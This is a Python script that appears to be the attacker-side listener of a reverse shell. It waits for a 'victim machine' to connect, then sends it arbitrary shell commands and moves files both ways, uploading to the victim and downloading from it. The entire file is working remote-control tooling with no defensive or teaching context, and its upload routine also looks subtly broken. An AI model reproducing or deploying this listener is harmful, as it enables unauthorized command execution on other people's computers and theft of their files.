#!/usr/bin/env python3

import socket, json
import argparse, base64

def get_args():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument("-i", "--ip_address", help="Provide Server IP")
    arg_parser.add_argument("-p", "--port", help="Provide PORT")
    options = arg_parser.parse_args()

    if not options.ip_address or not options.port:
        arg_parser.print_help()
        exit()
    return options

class Listener:

    def __init__(self, ip_address, port):

        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        listener.bind((ip_address, int(port)))
        listener.listen(0)
        print("[/] Waiting for incoming connections...")
        self.connection, address = listener.accept()
        print("[+] Got a connection from "+str(address))

    def download_file(self, path, body):
        try:
            with open(path, "wb") as ref:
                ref.write(base64.b64decode(body))
                return "[+] Download Successful!"
        except FileExistsError:
            return "[-] Download Failed!!"

    def remote_exec(self, command):
        self.safe_send(command)

        if command[0] == "exit":
            self.connection.close()
            exit()

        return self.safe_recv()

    def run(self):
        while True:
            # Input and processing of commands to be executed on the victim machine
            try:
                command = input("\> ")
                command = command.split(" ")
                # For uploading a file to the victims machine
                if command[0] == "rb_upload":
                    content = self.upload_file(command[1])
                    if "[-] Read Error" in content:
                        print(content)
                        continue
                    command.append(content)
                # For executing commands or the above processed upload command
                output = self.remote_exec(command)
                # For downloading a file from the victim machine
                if command[0] == "rb_download" and "[-] Read Error" not in output:
                    output = self.download_file(command[1], output)
            except Exception as e:
                output = "[-] Error in command execution!" + str(e)
            except KeyboardInterrupt:
                print("[-] Keyboard Interrupt detected..... Exiting")
                exit(0)
            print(output)

    def safe_send(self, command):
        self.connection.send(json.dumps(command).encode())

    def safe_recv(self):
        received_info = b""
        while True:
            try:
                received_info += self.connection.recv(4096)
                return json.loads(received_info)
            except ValueError:
                continue

    def upload_file(self, path):
        try:
            with open(path, "rb") as ref:
                return base64.b64encode(ref.read())
        except (FileNotFoundError, PermissionError, IsADirectoryError) as e:
            return "[-] Read Error: " + str(e)


if __name__ == "__main__":

    options = get_args()
    server_listener = Listener(options.ip_address, options.port)
    server_listener.run()